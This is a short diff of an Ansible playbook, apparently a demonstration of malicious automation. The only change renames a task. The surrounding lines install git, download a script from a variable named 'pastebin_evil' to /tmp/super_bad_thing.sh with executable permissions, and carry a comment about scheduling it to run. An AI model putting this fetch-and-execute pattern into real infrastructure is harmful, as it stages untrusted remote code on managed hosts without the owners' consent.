@@ -11,7 +11,7 @@
       - name: Trying to install git. 
         package: name=git #Install git if it does not exist, this will result in an "ok" if it was already installed or a "changed" if it was installed.
 
-      - name: Download and running pastebin scripts.
+      - name: Download pastebin script.
         get_url: url={{ pastebin_evil }} dest=/tmp/super_bad_thing.sh mode=0755
 
         #Schedule execution of pastebin script.
